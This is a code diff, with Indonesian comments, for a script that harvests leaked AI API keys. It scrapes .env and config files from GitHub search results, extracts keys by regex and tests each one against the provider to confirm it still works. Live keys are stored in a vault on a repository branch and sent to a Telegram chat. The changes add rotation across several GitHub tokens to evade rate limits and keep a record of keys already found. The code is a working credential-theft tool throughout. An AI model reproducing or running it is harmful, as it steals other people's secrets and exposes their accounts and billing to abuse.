@@ -23,7 +23,22 @@ import urllib.request
 import urllib.parse
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-GH_PAT = os.getenv("GH_PAT", "")
+GH_PATS_RAW = os.getenv("GH_PAT", "")
+GH_PATS = [p.strip() for p in GH_PATS_RAW.split(",") if p.strip()]
+if not GH_PATS:
+    for env_k in ["GH_PAT_1", "GH_PAT_2", "GH_PAT_3"]:
+        val = os.getenv(env_k, "").strip()
+        if val:
+            GH_PATS.append(val)
+
+_pat_index = 0
+def get_next_gh_token():
+    global _pat_index
+    if not GH_PATS:
+        return ""
+    tok = GH_PATS[_pat_index % len(GH_PATS)]
+    _pat_index += 1
+    return tok
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "1936436999")
 
@@ -86,8 +101,9 @@ def gh_search(query, page=1):
         "Accept": "application/vnd.github.v3+json",
         "User-Agent": "CiroFastDredger-v1"
     }
-    if GH_PAT:
-        headers["Authorization"] = f"Bearer {GH_PAT}"
+    tok = get_next_gh_token()
+    if tok:
+        headers["Authorization"] = f"Bearer {tok}"
     try:
         req = urllib.request.Request(url, headers=headers)
         with urllib.request.urlopen(req, timeout=20) as resp:
@@ -112,8 +128,9 @@ def fetch_raw_content(item):
     # URL mentah GitHub
     raw_url = f"https://raw.githubusercontent.com/{repo}/HEAD/{path}"
     headers = {"User-Agent": "Mozilla/5.0"}
-    if GH_PAT:
-        headers["Authorization"] = f"token {GH_PAT}"
+    tok = get_next_gh_token()
+    if tok:
+        headers["Authorization"] = f"token {tok}"
     
     try:
         req = urllib.request.Request(raw_url, headers=headers)
@@ -122,6 +139,90 @@ def fetch_raw_content(item):
             return f"{repo}/{path}", content
     except Exception:
         return None, None
+
+
+# === [PERSISTENT GOLD VAULT (ANTI DUPLIKAT TOKENS)] ========================
+GOLD_STATE_FILE = "gold_tokens_vault.json"
+
+def load_gold_vault():
+    """Memuat semua token yang sudah pernah ditemukan dari remote branch 'state'."""
+    known_tokens = set()
+    sha = None
+    tok = get_next_gh_token()
+    if not tok:
+        return known_tokens, sha
+    owner = os.getenv("GITHUB_REPOSITORY_OWNER") or "ciroxtreme"
+    repo_name = (os.getenv("GITHUB_REPOSITORY") or "ciroxtreme/ciro-scan").split("/")[-1]
+    url = f"https://api.github.com/repos/{owner}/{repo_name}/contents/{GOLD_STATE_FILE}?ref=state"
+    headers = {"Authorization": f"Bearer {tok}", "Accept": "application/vnd.github.v3+json", "User-Agent": "CiroGoldVault"}
+    try:
+        import base64
+        req = urllib.request.Request(url, headers=headers)
+        with urllib.request.urlopen(req, timeout=15) as resp:
+            data = json.loads(resp.read().decode())
+            sha = data.get("sha")
+            raw_content = base64.b64decode(data.get("content", "")).decode("utf-8")
+            vault_list = json.loads(raw_content)
+            for item in vault_list:
+                known_tokens.add(item.get("token"))
+            print(f"📦 Brangkas Emas Termuat: {len(known_tokens)} token unik sudah ada di arsip.")
+    except Exception:
+        print("ℹ️ Brangkas Emas baru dibuat.")
+    return known_tokens, sha
+
+def save_gold_vault(new_gold_items):
+    """Menyimpan akumulasi token emas baru ke branch 'state' (Database Terpusat)."""
+    tok = get_next_gh_token()
+    if not tok or not new_gold_items:
+        return
+    import base64
+    owner = os.getenv("GITHUB_REPOSITORY_OWNER") or "ciroxtreme"
+    repo_name = (os.getenv("GITHUB_REPOSITORY") or "ciroxtreme/ciro-scan").split("/")[-1]
+    
+    known_tokens, latest_sha = load_gold_vault()
+    
+    # Gabung dan dedup
+    merged_vault = []
+    seen = set()
+    # Baca yang lama dulu
+    url = f"https://api.github.com/repos/{owner}/{repo_name}/contents/{GOLD_STATE_FILE}?ref=state"
+    headers = {"Authorization": f"Bearer {tok}", "Accept": "application/vnd.github.v3+json", "User-Agent": "CiroGoldVault"}
+    try:
+        req = urllib.request.Request(url, headers=headers)
+        with urllib.request.urlopen(req, timeout=15) as resp:
+            data = json.loads(resp.read().decode())
+            raw_content = base64.b64decode(data.get("content", "")).decode("utf-8")
+            merged_vault = json.loads(raw_content)
+            for item in merged_vault:
+                seen.add(item.get("token"))
+    except:
+        pass
+        
+    for item in new_gold_items:
+        if item.get("token") not in seen:
+            seen.add(item.get("token"))
+            merged_vault.append(item)
+            
+    payload_data = json.dumps(merged_vault, indent=2)
+    b64_content = base64.b64encode(payload_data.encode("utf-8")).decode("utf-8")
+    
+    body = {
+        "message": f"chore(vault): update gold tokens vault (Total: {len(merged_vault)} tokens)",
+        "content": b64_content,
+        "branch": "state"
+    }
+    if latest_sha:
+        body["sha"] = latest_sha
+        
+    put_url = f"https://api.github.com/repos/{owner}/{repo_name}/contents/{GOLD_STATE_FILE}"
+    try:
+        req = urllib.request.Request(put_url, data=json.dumps(body).encode("utf-8"), headers={
+            **headers, "Content-Type": "application/json"
+        }, method="PUT")
+        with urllib.request.urlopen(req, timeout=20) as resp:
+            print(f"💾 Brangkas Emas Terupdate di branch 'state'! Total isi: {len(merged_vault)} token.")
+    except Exception as e:
+        print(f"⚠️ Gagal update brangkas state: {e}")
 
 def validate_key_live(provider, key, extra=None):
     """Tes cepat ke endpoint resmi apakah key masih hidup & aktif."""
@@ -216,9 +317,10 @@ def main():
 
     print(f"📥 Berhasil menyedot {len(downloaded_files)} file .env/config mentah!")
 
-    # 3. Ekstraksi Token AI pakai Regex Kilat
-    extracted_tokens = [] # list of (provider, token, source_file)
-    seen_tokens = set()
+    # 3. Ekstraksi Token AI pakai Regex Kilat (ANTI DUPLIKAT DARI BRANGKAS)
+    known_vault_tokens, _ = load_gold_vault()
+    extracted_tokens = []
+    seen_tokens = set(known_vault_tokens) # Jangan periksa lagi token yang sudah pernah disimpan!
 
     for src, text in downloaded_files.items():
         for prov, pattern in AI_PATTERNS.items():
@@ -253,7 +355,10 @@ def main():
 
     print(f"\n🏆 SELESAI! Ditemukan {len(active_gold)} TOKEN EMAS AKTIF!")
 
-    # 5. Simpan Hasil Emas & Kirim ke Telegram
+    # 5. Simpan Token Baru ke Brangkas Terpusat branch 'state'
+    if active_gold:
+        save_gold_vault(active_gold)
+
     report_file = "findings_gold_ai.json"
     with open(report_file, "w", encoding="utf-8") as f:
         json.dump(active_gold, f, indent=2)
@@ -275,9 +380,11 @@ def main():
     else:
         msg_lines.append("<i>Belum ada token aktif di batch ini, lanjut ke batch berikutnya!</i>")
 
-    send_telegram("\n".join(msg_lines))
     if active_gold:
-        send_telegram_doc(report_file, f"💎 File Emas Token AI ({len(active_gold)} Kunci Aktif)")
+        send_telegram("\n".join(msg_lines))
+        send_telegram_doc(report_file, f"💎 File Emas Token AI ({len(active_gold)} Kunci Baru Ditemukan)")
+    else:
+        print("ℹ️ Tidak ada token baru yang ditemukan di run ini. Telegram hening (tidak nyampah).")
 
 if __name__ == "__main__":
     main()
